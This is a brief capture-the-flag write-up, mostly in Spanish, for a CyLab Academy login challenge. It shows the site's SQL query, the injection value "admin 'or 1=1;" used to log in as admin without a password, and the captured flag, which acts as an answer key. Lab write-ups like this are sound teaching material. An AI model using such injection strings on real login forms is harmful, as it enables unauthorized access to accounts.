
## Descripción

Can you login to this website? Try to login [here](http://chatelaine.cylabacademy.net:19763/).

pistas:
1. `   admin` is the user you want to login as.
## Solución
Para este reto, deberemos de usar la inyección sql que ya habiamos usado antes, pues al ingresar cualquier cosa como admin=123 y password=123 nos saltará una página donde nos dice la consulta que hace:

```sql
SELECT * FROM users WHERE name='123' AND password='123'
```

sabemos que tenemos que usar esto:

```sql
admin 'or 1=1;
```
lo que nos arroja la flag:
academy{L00k5_l1k3_y0u_solv3d_it_d69457c6}
## Notas adicionales
- para encontrar la flag vimos el código fuente ya que no se veía a simple vista en el navegador
## Referencias
